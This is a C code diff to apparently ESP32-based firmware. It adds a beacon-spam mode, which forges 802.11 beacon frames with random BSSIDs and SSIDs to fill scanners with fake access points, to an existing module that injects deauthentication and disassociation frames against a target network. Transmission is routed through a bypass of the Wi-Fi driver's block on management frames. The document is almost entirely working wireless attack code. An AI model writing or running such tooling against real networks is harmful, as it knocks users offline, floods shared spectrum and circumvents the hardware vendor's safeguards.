@@ -6,12 +6,15 @@
 #include "esp_wifi_types.h"
 #include "esp_timer.h"
 #include "esp_log.h"
+#include "esp_random.h"
 #include <string.h>
 
 static const char *TAG = "svc_deauth";
 
 static esp_timer_handle_t s_timer = NULL;
-static uint8_t s_bssid[6];
+static uint8_t s_bssid[6];        /* target BSSID (deauth/disassoc) */
+static uint8_t s_beacon_bssid[6]; /* per-frame random BSSID (beacon spam) */
+static int s_channel = 1;         /* pinned channel, clamped 1..13 */
 static volatile uint32_t s_frames = 0;
 static volatile int s_tx_err = 0;      /* first TX error since start */
 static volatile int s_tx_errcode = 0;
@@ -57,21 +60,70 @@ static void build_disassoc(uint8_t *f, const uint8_t bssid[6]) {
     memcpy(f + 16, bssid, 6);
 }
 
+/* Beacon spam: FC 0x80 with a randomized source BSSID and a random
+ * printable SSID (1..10 chars) every tick, so nearby scanners see a
+ * stream of fake APs. Length is returned for the caller to TX. */
+static int build_beacon(uint8_t *f, uint8_t bssid[6], int channel) {
+    static const char alphabet[] =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    const size_t alen = sizeof(alphabet) - 1;
+    int ssid_len = 1 + (int)(esp_random() % 10); /* 1..10 */
+    for (int i = 0; i < 6; i++)
+        bssid[i] = (uint8_t)esp_random();
+    f[0] = 0x80;                     /* mgmt / beacon */
+    f[1] = 0x00;
+    f[2] = 0x00;
+    f[3] = 0x00;
+    memset(f + 4, 0xff, 6);          /* addr1: broadcast */
+    memcpy(f + 10, bssid, 6);        /* addr2: source = random BSSID */
+    memcpy(f + 16, bssid, 6);        /* addr3: BSSID */
+    f[22] = 0x00;                    /* sequence control */
+    f[23] = 0x00;
+    uint32_t ts = (uint32_t)esp_random();
+    f[24] = (uint8_t)(ts & 0xff);
+    f[25] = (uint8_t)((ts >> 8) & 0xff);
+    f[26] = (uint8_t)((ts >> 16) & 0xff);
+    f[27] = (uint8_t)((ts >> 24) & 0xff);
+    f[28] = 0x00;
+    f[29] = 0x00;
+    f[30] = 0x00;
+    f[31] = 0x00;
+    f[32] = 0x64;                    /* beacon interval 100 TU */
+    f[33] = 0x00;
+    f[34] = 0x11;                    /* capability info: ESS + privacy */
+    f[35] = 0x04;
+    f[36] = 0x00;                    /* SSID tag */
+    f[37] = (uint8_t)ssid_len;
+    for (int i = 0; i < ssid_len; i++)
+        f[38 + i] = (uint8_t)alphabet[esp_random() % alen];
+    int o = 38 + ssid_len;
+    f[o++] = 0x03;                   /* DS parameter set */
+    f[o++] = 0x01;
+    f[o++] = (uint8_t)channel;
+    return o;
+}
+
 static void tx_tick(void *arg) {
     (void)arg;
     s_ticks++;                       /* proof the callback fires at all */
     /* TX goes through the WSL bypass so the driver's frame-type gate
      * accepts management subtypes (see wsl_bypasser.h). */
-    uint8_t f[26];
+    uint8_t f[64];
     int ok_count = 0;
     esp_err_t err = ESP_OK;
     int passes = (s_mode == DEAUTH_MODE_COMBINED) ? 2 : 1;
     for (int i = 0; i < passes; i++) {
-        if (s_mode == DEAUTH_MODE_DISASSOC)
-            build_disassoc(f, s_bssid);
-        else
+        int len = sizeof(f);
+        if (s_mode == DEAUTH_MODE_BEACON) {
+            len = build_beacon(f, s_beacon_bssid, s_channel);
+        } else {
             build_deauth(f, s_bssid);
-        err = wsl_send_raw(f, (int)sizeof(f));
+            if (s_mode == DEAUTH_MODE_DISASSOC) {
+                build_disassoc(f, s_bssid);
+            }
+            len = 26;
+        }
+        err = wsl_send_raw(f, len);
         s_last_err = (int)err;
         if (err == ESP_OK)
             ok_count++;
@@ -123,7 +175,9 @@ int svc_deauth_start(deauth_mode_t mode) {
         return 0;
     if (mode >= DEAUTH_MODE_COUNT)
         return -1;
-    if (!tgt_wifi_has())
+    /* Beacon spam invents its own BSSIDs, so it needs no session target;
+     * the deauth family requires one. */
+    if (mode != DEAUTH_MODE_BEACON && !tgt_wifi_has())
         return -1;
     s_mode = mode;
     memcpy(s_bssid, tgt_wifi_bssid(), 6);
@@ -135,6 +189,7 @@ int svc_deauth_start(deauth_mode_t mode) {
         ch = 1;
     if (ch > 13)
         ch = 13;
+    s_channel = ch;
     if (esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE) != ESP_OK)
         return -3;
     esp_err_t perr = probe_tx();
@@ -166,7 +221,8 @@ int svc_deauth_start(deauth_mode_t mode) {
         s_timer = NULL;
         return -5;
     }
-    ESP_LOGI(TAG, "running, ch %d", ch);
+    ESP_LOGI(TAG, "running, mode %s, ch %d",
+             svc_deauth_mode_name(s_mode), ch);
     return 0;
 }
 
@@ -214,6 +270,7 @@ const char *svc_deauth_mode_name(deauth_mode_t m) {
         case DEAUTH_MODE_DEAUTH:   return "Deauth";
         case DEAUTH_MODE_DISASSOC: return "Disassoc";
         case DEAUTH_MODE_COMBINED: return "Deauth+Disassoc";
+        case DEAUTH_MODE_BEACON:   return "BeaconSpam";
         default:                   return "?";
     }
 }
